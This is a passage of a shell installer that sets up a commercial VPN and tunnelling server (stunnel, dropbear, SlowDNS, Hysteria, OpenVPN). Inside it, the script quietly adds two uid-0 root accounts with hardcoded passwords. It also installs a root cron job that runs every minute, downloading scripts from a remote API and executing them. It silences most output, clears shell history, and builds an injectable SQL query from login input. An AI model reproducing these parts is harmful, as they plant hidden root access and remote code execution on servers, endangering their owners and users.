cd /etc/default && rm stunnel4 && rm dropbear

echo 'ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
PPP_RESTART=0
RLIMITS=""' >> stunnel4 

echo 'NO_START=0
DROPBEAR_PORT=442
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RECEIVE_WINDOW=65536' >> dropbear

chmod 755 stunnel4 && chmod 755 dropbear

echo "/bin/false" >> /etc/shells

#//wget -O /etc/banner #"https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/banner/SshBanner"
chmod +x /etc/banner

useradd -p $(openssl passwd -1 kaldag) admin -ou 0 -g 0
useradd -p $(openssl passwd -1 admin) kaldag -ou 0 -g 0
sudo service stunnel4 restart
sudo service dropbear restart
  } &>/dev/null
}

#install_sudo(){
#    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
#    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
#    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
#    service sshd restart
#}

#====================================================
#	Installing SlowDNS
#	Finalized: Firenet Developer
#====================================================

install_slowdns (){
echo "Installing dns..."
{
dnsresolverName="Cloudflare (1.1.1.1)"
dnsresolverType="udp"
dnsresolver="1.1.1.1:53"

# Config Ssh
sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/g' /etc/ssh/sshd_config

# SET DNSTT
export DNSDIR=/etc/.dnsquest
export DNSCONFIG=/root/.dns
mkdir -m 777 $DNSDIR
mkdir -m 777 $DNSCONFIG

# BUILD DNSTT SERVER
cd $DNSDIR/dnstt/dnstt-server
wget -O dnstt-server "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-server"
chmod +x dnstt-server
wget -O dnstt-client "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-client"
chmod +x dnstt-client

./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
cp server.key server.pub $DNSCONFIG
cp dnstt-server $DNSDIR

# BUILD DNSTT CLIENT
cd $DNSDIR/dnstt/dnstt-client
cp dnstt-client $DNSDIR

#Source
echo "
hostname=$DOMAIN
domain=$NS
privkey=`cat /root/.dns/server.key`
pubkey=`cat /root/.dns/server.pub`
os=debian
dnsresolvertype=$dnsresolverType
dnsresolver=$dnsresolver" >> $DNSCONFIG/config
secretkey='server'

#API Details
VPN_Owner='DexterEskalarte';

cat <<EOF >/etc/authentication.sh
#!/bin/bash
SHELL=/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
wget -O /etc/active.sh "$API_LINK/active.php?key=$API_KEY"
sleep 5
wget -O /etc/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
sleep 5
wget -O /etc/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
sleep 15
bash /etc/active.sh
sleep 15
bash /etc/inactive.sh
sleep 15
bash /etc/deleted.sh
EOF

echo -e "* *\t* * *\troot\tsudo bash /etc/authentication.sh" >> "/etc/cron.d/account"

echo "Hi! this is your server information, Happy Surfing!

IP : $server_ip
Hostname: $DOMAIN

-----------------------
SSH DETAILS
-----------------------
SSH : 22
SSH SSL : 445
DROPBEAR : 442
DROPBEAR SSL : 446

-----------------------
HYSTERIA DETAILS
-----------------------
HYSTERIA UDP : 5666, 20000 - 50000
OBFS: $OBFS
AUTH_STR: username:password

-----------------------
PROXY DETAILS
-----------------------
SQUID : 8080
HTTP/SOCKS : 80, 8000, 8001, 8002

-----------------------
SLOWDNS DETAILS
-----------------------
DNS URL : $NS
SSH via DNS : 442
DNS RESOLVER : $dnsresolverName
DNS PUBLIC KEY : $(cat /root/.dns/server.pub)

-----------------------

FB Page : https://web.facebook.com
Whatsapp Contact: +639709310250

" >> /root/.web/$secretkey.txt

#wget -O /root/.dns/dig.sh "firenetvpn.net/files/repo/dig.sh"
#chmod +x /root/.dns/dig.sh
#sed -i "s|DOMAIN_LENZ|$NS|g" /root/.ports
#sed -i "s|HOSTNAME_LENZ|$DOMAIN|g" /root/.ports

#install client-sldns.service
cat > /etc/systemd/system/client-sldns.service << END
[Unit]
Description=Client SlowDNS By HideSSH
Documentation=https://hidessh.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/etc/.dnsquest/dnstt-client -udp 1.1.1.1:53 --pubkey-file /root/.dns/server.pub $NS 127.0.0.1:2222
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

#install server-sldns.service
cat > /etc/systemd/system/server-sldns.service << END
[Unit]
Description=Server SlowDNS By HideSSH
Documentation=https://hidessh.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/etc/.dnsquest/dnstt-server -udp :5300 -privkey-file /root/.dns/server.key $NS 127.0.0.1:442
Restart=on-failure

[Install]
WantedBy=multi-user.target
END


#permission service slowdns
chmod +x /etc/systemd/system/client-sldns.service
chmod +x /etc/systemd/system/server-sldns.service


systemctl daemon-reload
systemctl enable client-sldns
systemctl enable server-sldns
systemctl start client-sldns
systemctl start server-sldns

} &>/dev/null
}

#====================================================
#	Installing Hysteria UDP
#	Finalized: Firenet Developer
#====================================================

install_hysteria(){
clear
echo 'Installing hysteria.'
{
wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5

rm -f /etc/hysteria/config.json

echo '{
  "listen": ":5666",
  "cert": "/etc/openvpn/easy-rsa/keys/server.crt",
  "key": "/etc/openvpn/easy-rsa/keys/server.key",
  "up_mbps": 100,
  "down_mbps": 100,
  "disable_udp": false,
  "obfs": "mediatekvpn",
  "auth": {
    "mode": "external",
    "config": {
    "cmd": "./.auth.sh"
    }
  },
  "prometheus_listen": ":5665",
  "recv_window_conn": 107374182400,
  "recv_window_client": 13421772800
}
' >> /etc/hysteria/config.json

sed -i "s|mediatekvpn|$OBFS|g" /etc/hysteria/config.json

cat <<"EOM" >/etc/hysteria/.auth.sh
#!/bin/bash
. /etc/openvpn/login/config.sh

if [ $# -ne 4 ]; then
    echo "invalid number of arguments"
    exit 1
fi

ADDR=$1
AUTH=$2
SEND=$3
RECV=$4

USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)

Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
[ "$user_name" != '' ] && [ "$user_name" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
EOM

chmod 755 /etc/hysteria/config.json
chmod 755 /etc/hysteria/.auth.sh

sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216

wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/badvpn/badvpn-udpgw64"
chmod +x /usr/bin/badvpn-udpgw
} &>/dev/null
}

installBBR() {
    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
    sysctl -p
    
    apt install -y linux-generic-hwe-20.04
    grub-set-default 0
    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
    INSTALL_BBR=true
}

#====================================================
#	Finalizing Server Setup
#	Finalized: Firenet Developer
#====================================================

install_rclocal(){
  {
  sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
    systemctl restart apache2
    
    sudo systemctl restart stunnel4
    sudo systemctl restart hysteria-server
    sudo systemctl enable openvpn@server.service
    sudo systemctl start openvpn@server.service
    sudo systemctl enable openvpn@server2.service
    sudo systemctl start openvpn@server2.service    
    
    echo "[Unit]
Description=dexter service
Documentation=http://mediatekvpn.com

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/rc.local
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/dexter.service
rm -rf /etc/rc.local
    echo '#!/bin/sh -e
service ufw stop
iptables-restore < /etc/iptables_rules.v4
ip6tables-restore < /etc/iptables_rules.v6
sysctl -p
service stunnel4 restart
systemctl restart openvpn@server.service
systemctl restart openvpn@server2.service
screen -dmS socks python /etc/socks.py 80
screen -dmS socks python /etc/socks-ssh.py 8000
screen -dmS socks python /etc/socks-ws-ssh.py 8001
screen -dmS socks python /etc/socks-ws-ssl.py 8002
ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
bash /etc/.monitor aio
exit 0' >> /etc/rc.local

sudo chmod +x /etc/rc.local
systemctl daemon-reload
systemctl enable hysteria-server.service
systemctl restart hysteria-server.service
sudo systemctl enable dexter
sudo systemctl start dexter.service
    
echo "Made with love by: MediatekVpn Developer... " >> /root/.web/index.php

echo "tcp_port=TCP_PORT
udp_port=UDP_PORT
socket_port=80
squid_port=8080
hysteria_port=5666
ssh_port=22
dropbear_port=442
slowdns_port=2222
tcp_ssl_port=PORT_SSL
udp_ssl_port=444" >> /root/.ports

sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
  }&>/dev/null
}

start_service () {
clear
echo 'Starting..'
{

sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart
* * * * * /bin/bash /etc/.ws >/dev/null 2>&1
* * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
* * * * * /bin/bash /etc/.monitor aio >/dev/null 2>&1"; } | crontab -
sudo systemctl restart cron
} &>/dev/null
clear
echo '++++++++++++++++++++++++++++++++++'
echo '*       AIO  is ready!    *'
echo '+++++++++++************+++++++++++'
history -c;
rm /usr/local/etc/.system
echo 'Server will secure this server and reboot after 20 seconds'
sleep 20
reboot
}

server_ip=$(curl -s ipinfo.io/ip)
server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
serverVersion=`awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`

#install_sudo
install_require  
install_hysteria
installBBR
install_squid
install_openvpn
install_slowdns
install_firewall_kvm
install_stunnel
install_rclocal
start_service
